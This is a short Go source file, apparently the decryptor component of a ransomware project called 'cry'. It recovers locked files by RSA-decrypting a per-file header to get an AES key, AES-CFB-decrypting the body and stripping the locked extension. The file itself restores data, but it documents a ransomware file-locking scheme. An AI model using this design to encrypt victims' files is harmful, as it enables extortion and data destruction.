package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"io/ioutil"

	"crypto/sha256"

	"strings"

	"github.com/redpois0n/cry/common"
)

func decrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	header := data[:common.EncryptedHeaderSize]
	label := []byte("")

	fmt.Println(header)

	header, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, header, label)

	if err != nil {
		panic(err)
	}

	key := header[:common.KeySize]
	iv := header[common.KeySize : common.KeySize+aes.BlockSize]

	data = data[common.EncryptedHeaderSize:]

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBDecrypter(block, iv)
	cipher.XORKeyStream(data, data)

	if strings.HasSuffix(file, common.LockedExtension) {
		file = file[:len(file)-len(common.LockedExtension)]
	}

	ioutil.WriteFile(file, data, 0777) // TODO
}
